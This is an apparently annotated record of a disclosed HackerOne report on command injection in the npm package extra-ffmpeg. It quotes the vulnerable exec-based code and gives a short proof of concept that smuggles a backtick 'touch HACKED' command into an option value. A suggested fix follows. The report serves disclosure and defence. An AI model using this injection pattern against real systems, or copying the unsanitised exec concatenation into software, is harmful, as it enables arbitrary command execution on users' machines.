{
  "reported_to": "Node.js third-party modules",
  "reported_by": "d3lla ",
  "title": "[extra-ffmpeg] Command Injection via insecure command formatting",
  "content": "\nI would like to report a Command Injection issue in the extra-ffmpeg module.\nIt allows to execute arbitrary commands on the victim's PC.\nModule\nmodule name: extra-ffmpeg\nversion: 4.0.3\nnpm page: https://www.npmjs.com/package/extra-ffmpeg\nModule Description\nDecode, encode, transcode, mux, demux, stream, filter, and play media through machine (via \"ffmpeg\").\nModule Stats\n[99] weekly downloads\nVulnerability\nVulnerability Description\nThe issue occurs because a user input parameter is used inside a command that is executed without any check.\nHere's the code which causes the issue:\nCode 1.12 KiB\n1// https://github.com/nodef/extra-ffmpeg/blob/master/index.js#L19\n2const cp = require('child_process');\n3\n4\n5// Global variables.\n6const STDIO = [0, 1, 2];\n7\n8\n9 // Generate command for ffmpeg.\n10 function command(os) {\n11  var z = 'ffmpeg';\n12  var os = os||[];\n13  for(var o of os) {\n14    var o = o||{};\n15    for(var k in o) {\n16      if(o[k]==null) continue;\n17      if(k==='stdio') continue;\n18      if(k==='o' || k==='outfile') z += ` \"${o[k]}\"`;\n19      else if(typeof o[k]==='boolean') z += o[k]? ` -${k}`:'';\n20      else z += ` -${k} ${JSON.stringify(o[k])}`;  // <-- injection\n21    }\n22  }\n23  return z;\n24};\n25\n26/**\n27 * Invoke \"ffmpeg\" synchronously.\n28 * @param {object} os ffmpeg options.\n29 */\n30function sync(os) {\n31  var stdio = os.stdio===undefined? STDIO:os.stdio;\n32  return cp.execSync(command(os), {stdio});\n33};\n34\n35/**\n36 * Invoke \"ffmpeg\" asynchronously.\n37 * @param {object} os ffmpeg options.\n38 */\n39function ffmpeg(os) {\n40  var stdio = os.stdio===undefined? STDIO:os.stdio;\n41  return new Promise((fres, frej) => cp.exec(command(os), {stdio}, (err, stdout, stderr) => {\n42    if(err) frej(err);\n43    else fres({stdout, stderr});\n44  }));\n45};\n46ffmpeg.sync = sync;\n47module.exports = ffmpeg;\nThe os parameter contains the option parameters for the command ffmpeg.\nThe final command that is passed to the child_process.exec function is built formatting the options value without any check.\nSteps To Reproduce:\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall extra-ffmpeg module:\nnpm i extra-ffmpeg\nnpm i extra-ffmpeg\ncreate the following PoC JavaScript file (poc.js):\nCode 121 Bytes\n1const ffmpeg = require('extra-ffmpeg');\n2ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);\n3\nmake sure that the HACKED file does not exist:\nls\nls\nexecute the poc.js file:\nnode poc.js\nnode poc.js\nthe HACKED file is created:\nls\nls\nPatch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it.\nIn my opinion, it's better to use child_process.execFile or child_process.spawn functions instead of child_process.exec.\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v13.13.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nCommand Injection on extra-ffmpeg module via insecure command formatting.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1597928880,
  "report_url": "https://hackerone.com/reports/863944",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the extra-ffmpeg module: npm i extra-ffmpeg"
    ],
    [
      2,
      "Create a PoC JavaScript file (poc.js) with the following content: const ffmpeg = require('extra-ffmpeg'); ffmpeg.sync([{y: true}, {i: '`touch HACKED`'}, {acodec: 'copy', o: 'aud.mp3'}]);"
    ],
    [
      3,
      "Execute the poc.js file: node poc.js"
    ],
    [
      4,
      "Verify that the HACKED file is created: ls"
    ]
  ],
  "vuln_description": "The vulnerability is a command injection issue in the extra-ffmpeg module, where user input is directly used in a command string without proper sanitization, allowing arbitrary command execution on the victim's PC.",
  "reason": "The vulnerability is straightforward to discover as it involves a common pattern of insecure command formatting in Node.js modules. The attack requires minimal components and the interaction is obvious once the command injection vector is identified.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection via insecure command formatting in the extra-ffmpeg module, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on detecting AuthN/AuthZ vulnerabilities by testing user sessions and resource access, not command injection vulnerabilities.",
    "is_detectable": false
  }
}